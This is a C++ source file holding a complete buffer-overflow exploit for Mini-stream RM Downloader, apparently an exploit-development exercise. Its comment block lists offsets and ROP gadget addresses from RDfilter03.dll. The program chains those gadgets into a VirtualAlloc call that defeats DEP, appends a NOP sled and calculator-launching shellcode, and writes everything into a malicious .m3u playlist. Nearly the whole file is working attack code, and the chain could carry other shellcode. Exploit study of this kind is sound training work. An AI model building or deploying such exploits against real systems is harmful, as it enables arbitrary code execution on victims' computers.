#include "C:\\BE\\includes.h"
#include <fstream>

/*
	
	Windows 7
	---------

		EIP offset: 36694135  ->  [*] Exact match at offset 257

	-----------------------

		!mona modules (non: Rebase, SafeSEH, ASLR, NXCompat)
			RDfilter03.dll

	-----------------------

		0x1004c060 : ptr to kernel32!virtualalloc (RDfilter03.dll)
		"\x60\xc0\x04\x10"

	-----------------------

		Structure:                                 Parameters:

		LPVOID WINAPI VirtualAlloc(          =>    A pointer to VirtualAlloc()
		  _In_opt_  LPVOID lpAddress,        =>    Return Address (Redirect Execution to ESP)
		  _In_      SIZE_T dwSize,           =>    dwSize (0x1)
		  _In_      DWORD flAllocationType,  =>    flAllocationType (MEM_COMMIT 0x1000)
		  _In_      DWORD flProtect          =>    flProtect (PAGE_EXECUTE_READWRITE 0x40)
		);

	-----------------------

		GOALS
			EAX 90909090 => Nop
			ECX 00000040 => flProtect (64 DEC = 40 HEX)
			EDX 00001000 => flAllocationType 
			EBX 00000001 => dwSize
			ESP ???????? => Leave as is
			EBP ???????? => Call to ESP (jmp, call, push,..)
			ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1004c060 -> "\x60\xc0\x04\x10"
			EDI 10029728 => ROP-Nop same as EIP

Random RETN to get to our ROP-Chain in the ESP:
	
		Found sequences (All Modules), item 19685
		Address=		10029728  ->  "\x28\x97\x02\x10"
		Disassembly=	RETN
		Module Name=	RDfilter03.dll

EAX:
	* POP EAX and put inside "\x90\x90\x90\x90"
	
		0x1002e702 (RVA : 0x0002e702) : # POP EAX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
		"\x02\xe7\x02\x10"

ECX:

	1. POP EAX
	2. ADD EAX, 40
	3. MOV EAX -> ECX

		1.
			0x1002e702 (RVA : 0x0002e702) : # POP EAX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x02\xe7\x02\x10"
			
		2.
			0x1002ea71 (RVA : 0x0002ea71) : # ADD EAX,40 # POP EBP # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x71\xea\x02\x10"

		3.
			0x1002eb69 (RVA : 0x0002eb69) : # XCHG EAX,ECX # ADD EAX,41048A10 # AND EAX,8 # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x69\xeb\x02\x10"

		* if the pop ebp make problems there is a clean # ADD EAX, 20

EDX:
	
	1. POP EAX
	2. XOR EAX, EAX
	3. ADD EAX, 100 * 10
	4. MOV EAX -> ESI
	5. XOR EDX, EDX
	6. MOV EDX, ESI

		1.
			0x1002e702 (RVA : 0x0002e702) : # POP EAX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x02\xe7\x02\x10"

		2 XOR EAX
		
			0x10031a83 (RVA : 0x00031a83) : # XOR EAX,EAX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x83\x1a\x03\x10"

		3. (25 times)
			0x1002ea7c (RVA : 0x0002ea7c) : # ADD EAX,100 # POP EBP # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x7c\xea\x02\x10"

		4.

			0x1003d564 (RVA : 0x0003d564) : # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x64\xd5\x03\x10"

		5.

			0x1002678c (RVA : 0x0002678c) : # XOR EDX,EDX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x8c\x67\x02\x10"

		6.

			0x1003f28d (RVA : 0x0003f28d) : # ADC EDX,ESI # POP ESI # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
			"\x8d\xf2\x03\x10"

EBP:

	0x1002ec02 (RVA : 0x0002ec02) : # POP EBP # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
	"\x02\xec\x02\x10"

	Call to ESP (jmp, call, push,..)

		Address=	1003AD43
		Message=	0x1003ad43 : push esp # ret  |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)
					"\x43\xad\x03\x10"

ESI:

	1. POP EAX
	2. Put the VirtualAlloc Address in EAX
	3. Move EAX into ESI

	1.
		0x1002e702 (RVA : 0x0002e702) : # POP EAX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
		"\x02\xe7\x02\x10"

	2.
		"\x60\xc0\x04\x10"  ->  VirtualAlloc() Address

		0x1002f04f (RVA : 0x0002f04f) : # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
		"\x4f\xf0\x02\x10"

	3. 

		0x1003d564 (RVA : 0x0003d564) : # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
		"\x64\xd5\x03\x10"

EDI:
	
	0x10029b8b (RVA : 0x00029b8b) : # POP EDI # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
	"\x8b\x9b\x02\x10"

	"\x28\x97\x02\x10" -> ROP-Nop


PUSHAD:

	0x10030b86 (RVA : 0x00030b86) : # PUSHAD # RETN    ** [RDfilter03.dll] **   |   {PAGE_EXECUTE_READ}
	"\x86\x0b\x03\x10"

*/


int main()
{
	std::ofstream file("exploit.m3u");

	// Generate A's
	int offset = 257;
	std::string A = MultipleString("A", offset);

	// EAX Chunk Affects: EAX
	std::string eax = "\x02\xe7\x02\x10"; // a pointer to a # POP EAX # RETN
	eax += "\x90\x90\x90\x90";

	// EBX Chunk Affects: EAX, EBP, EBX
	std::string ebx = "\x02\xe7\x02\x10"; // a pointer to a # POP EAX # RETN
	ebx += "\x71\xea\x02\x10"; // a pointer to a # ADD EAX,40 # POP EBP # RETN 
	ebx += "\x69\xeb\x02\x10"; // a pointer to a # XCHG EAX,ECX # ADD EAX,41048A10 # AND EAX,8 # RETN

	// ECX Chunk Affects: EAX, ECX
	std::string ecx = "\x02\xe7\x02\x10"; // a pointer to a # POP EAX # RETN
	ecx += "\x71\xea\x02\x10"; // a pointer to a # ADD EAX,40 # POP EBP # RETN
	ecx += "\x69\xeb\x02\x10"; // a pointer to a # XCHG EAX,ECX # ADD EAX,41048A10 # AND EAX,8 # RETN

	// EDX Chunk Affects: EAX, EBP, EBX, ESI, EDX
	std::string edx = "\x02\xe7\x02\x10"; // a pointer to a # POP EAX # RETN
	edx += "\x83\x1a\x03\x10"; // a pointer to a # XOR EAX,EAX # RETN
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 100
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 200
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 300
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 400
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 500
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 600
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 700
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 800
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 900
	edx += "\x7c\xea\x02\x10"; // a pointer to a # ADD EAX,100 # POP EBP # RETN | 1000
	edx += "\x64\xd5\x03\x10"; // a pointer to a # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
	edx += "\x8c\x67\x02\x10"; // a pointer to a # XOR EDX,EDX # RETN
	edx += "\x8d\xf2\x03\x10"; // a pointer to a # ADC EDX,ESI # POP ESI # RETN

	// EBP Chunk Affects: EBP
	std::string ebp = "\x02\xec\x02\x10"; // a pointer to a # POP EBP # RETN
	ebp += "\x43\xad\x03\x10"; // a pointer to a # push esp # ret

	// ESI Chunk Affects: EAX, EBP, EBX, ESI
	std::string esi = "\x02\xe7\x02\x10"; // a pointer to a # POP EAX # RETN
	esi += "\x60\xc0\x04\x10"; // VirtualAlloc Address
	esi += "\x4f\xf0\x02\x10"; // a pointer to a # MOV EAX,DWORD PTR DS:[EAX] # RETN
	esi += "\x64\xd5\x03\x10"; // a pointer to a # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN

	// EDI Chunk Affects: EDi
	std::string edi = "\x8b\x9b\x02\x10"; // a pointer to a # POP EDI # RETN
	edi += "\x28\x97\x02\x10"; // a pointer to a ROP NOP

	// PUSHAD Chunk
	std::string pushad = "\x86\x0b\x03\x10"; // a pointer to a # PUSHAD # RETN
	

	// ROP
	std::string rop = "";
	rop += edx;
	rop += esi;
	rop += ebx;
	rop += ecx;
	rop += ebp;
	rop += edi;
	rop += eax;
	rop += pushad;

	// Calculator Shellcode
	char calc_shellcode[] =
		"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
		"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
		"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
		"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
		"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
		"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7";

	// Generating NOP
	std::string nopsled = MultipleString("\x90", 16);

	// Generate padding
	std::string padding = MultipleString("D", 30000 - offset - 4 - rop.length() - nopsled.length() - (sizeof(calc_shellcode) / sizeof(calc_shellcode[0])));

	std::string exploit = A;
	exploit += "\x28\x97\x02\x10"; // Random pointer to a RETN so we get into the ESP
	exploit += rop;
	exploit += nopsled;
	exploit += calc_shellcode;
	exploit += padding;

	file << "#EXTM3U\n#EXTINF:123, Sample artist - Sample title\nhttp://" << exploit;

	return 0;
}